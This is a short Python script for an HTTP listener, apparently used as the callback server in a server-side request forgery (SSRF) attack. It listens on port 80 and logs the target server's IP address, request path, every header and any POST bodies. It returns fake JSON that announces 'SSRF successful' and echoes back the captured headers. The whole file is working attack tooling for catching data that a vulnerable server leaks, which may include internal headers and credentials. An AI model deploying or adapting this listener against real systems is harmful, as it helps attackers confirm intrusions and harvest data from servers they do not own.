from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class SSRFHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Retrieve the IP address of the connecting server
        server_ip, server_port = self.client_address
        # Log everything, including the IP
        print(f"\n{'='*60}")
        print(f"[+] Requesting Server IP: {server_ip}")
        print(f"[+] Path: {self.path}")
        print(f"[+] Headers:")
        for header, value in self.headers.items():
            print(f"    {header}: {value}")
        print(f"{'='*60}\n")
        
        # --- Response Logic (Kept the same for valid JSON) ---
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        # Send fake but valid JSON response, including the captured IP
        response = {
            "tasks": [],
            "captured": "SSRF successful",
            "source_ip": server_ip,
            "headers_received": dict(self.headers)
        }
        self.wfile.write(json.dumps(response).encode())
    
    def do_POST(self):
        # Retrieve the IP address of the connecting server
        server_ip, server_port = self.client_address
        
        # Get the content length to read the body
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else ""
        
        # Log in curl-like format
        print(f"\n{'='*60}")
        print(f"Connection from: {server_ip}:{server_port}")
        print(f"> POST {self.path} HTTP/1.1")
        print(f"> Host: {self.headers.get('Host', 'N/A')}")
        for header, value in self.headers.items():
            if header.lower() != 'host':  # Already printed Host
                print(f"> {header}: {value}")
        print(f"> ")
        if post_body:
            print(f"Request Body: {post_body}")
        print(f"{'='*60}\n")
        
        # Send SUCCESS response (as JSON string to match the example)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'"Success"')
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    # Listen on all interfaces (0.0.0.0) on port 80
    server = HTTPServer(('0.0.0.0', 80), SSRFHandler)
    print(f'[*] Listening on port 80. External IP for target: 52.66.187.32 (Example IP)')
    server.serve_forever()
